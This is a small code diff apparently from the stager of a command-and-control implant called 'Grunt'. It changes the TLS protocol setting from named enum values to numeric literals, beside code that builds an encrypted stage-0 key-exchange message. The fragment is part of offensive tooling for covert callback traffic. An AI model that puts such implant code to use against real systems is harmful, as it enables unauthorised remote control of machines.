@@ -58,7 +58,7 @@ namespace GruntStager
                 byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                 string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
 
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc0 | 0x300 | 0xc00);
                 ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                 {
                     bool valid = true;
